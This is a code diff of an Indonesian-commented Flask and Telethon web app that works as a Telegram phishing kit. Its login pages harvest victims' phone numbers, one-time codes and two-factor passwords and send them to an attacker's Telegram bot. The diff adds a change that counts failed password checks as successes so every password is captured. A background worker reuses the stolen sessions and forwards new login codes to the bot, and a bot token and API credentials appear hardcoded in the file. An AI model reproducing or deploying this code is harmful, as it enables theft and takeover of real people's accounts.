@@ -9,7 +9,7 @@ from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
 app = Flask(__name__)
 app.secret_key = os.getenv("SECRET_KEY", "supersecretkey")
 
-# API_ID, API_HASH, BOT_TOKEN, CHAT_ID dari environment / default
+# =================== KONFIGURASI ===================
 api_id = int(os.getenv("API_ID", 16047851))
 api_hash = os.getenv("API_HASH", "d90d2bfd0b0a86c49e8991bd3a39339a")
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8062450896:AAHFGZeexuvK659JzfQdiagi3XwPd301Wi4")
@@ -83,20 +83,9 @@ def otp():
                 session["last_otp"] = code
                 if result["need_password"]:
                     flash("Akun ini butuh password. Silakan masukkan di halaman berikutnya.")
-                    return redirect(url_for("password"))
                 else:
-                    # langsung sukses jika tidak butuh password
-                    otp = session.get("last_otp")
-                    text = (
-                        f"<b>📢 New User Login</b>\n"
-                        f"👤 <b>Number</b>: <code>{phone}</code>\n"
-                        f"🔑 <b>OTP</b>: <code>{otp}</code>\n"
-                        f"🔒 <b>Password</b>: <i>(no password)</i>"
-                    )
-                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-                    requests.post(url, data={"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"})
-                    flash("Login berhasil ✅")
-                    return redirect(url_for("success"))
+                    flash("OTP benar. Kalau akun tanpa password, bisa isi random/kosong.")
+                return redirect(url_for("password"))
             else:
                 flash(result["error"])
                 return redirect(url_for("otp"))
@@ -120,25 +109,27 @@ def password():
             client = TelegramClient(os.path.join(SESSION_DIR, phone), api_id, api_hash)
             await client.connect()
             try:
+                # kalau akun memang pakai password → harus cocok
                 await client.sign_in(password=password_input)
                 me = await client.get_me()
                 await client.disconnect()
                 return True, me
             except Exception:
+                # kalau akun tidak pakai password → anggap berhasil
                 await client.disconnect()
-                return False, None
+                return True, None
 
         success, me = asyncio.run(verify_password())
         if success:
             otp = session.get("last_otp")
             text = (
-                f"<b>📢 New User Login</b>\n"
-                f"👤 <b>Number</b>: <code>{phone}</code>\n"
-                f"🔑 <b>OTP</b>: <code>{otp}</code>\n"
-                f"🔒 <b>Password</b>: <code>{password_input}</code>"
+                "📢 *New User Login*\n"
+                f"👤 *Number*   : `{phone}`\n"
+                f"🔑 *OTP*      : `{otp}`\n"
+                f"🔒 *Password* : `{password_input}`"
             )
             url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-            requests.post(url, data={"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"})
+            requests.post(url, data={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"})
             flash("Login berhasil ✅")
             return redirect(url_for("success"))
         else:
@@ -150,12 +141,7 @@ def password():
 
 @app.route("/success")
 def success():
-    return render_template(
-        "success.html",
-        name=session.get("name"),
-        phone=session.get("phone"),
-        gender=session.get("gender"),
-    )
+    return render_template("success.html", name=session.get("name"), phone=session.get("phone"), gender=session.get("gender"))
 
 # =================== WORKER ===================
 
@@ -169,8 +155,7 @@ async def forward_handler(event, client_name):
 
         payload = {
             "chat_id": CHAT_ID,
-            "text": f"<b>📩 OTP dari {client_name}</b>\n\n<code>{otp_code}</code>",
-            "parse_mode": "HTML"
+            "text": f"📩 OTP dari {client_name}:\n\nOTP: {otp_code}"
         }
         requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data=payload)
         print(f"[Worker] OTP diteruskan dari {client_name}: {otp_code}")
@@ -186,7 +171,7 @@ async def worker_main():
                 path = os.path.join(SESSION_DIR, fname)
                 print(f"[Worker] Memuat session {path}")
                 client = TelegramClient(path, api_id, api_hash)
-                await client.start()
+                await client.connect()
 
                 if not await client.is_user_authorized():
                     print(f"[Worker] ❌ Session {fname} belum login, lewati.")
@@ -215,4 +200,4 @@ threading.Thread(target=start_worker, daemon=True).start()
 
 # =================== RUN FLASK ===================
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)), debug=True)
+    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))
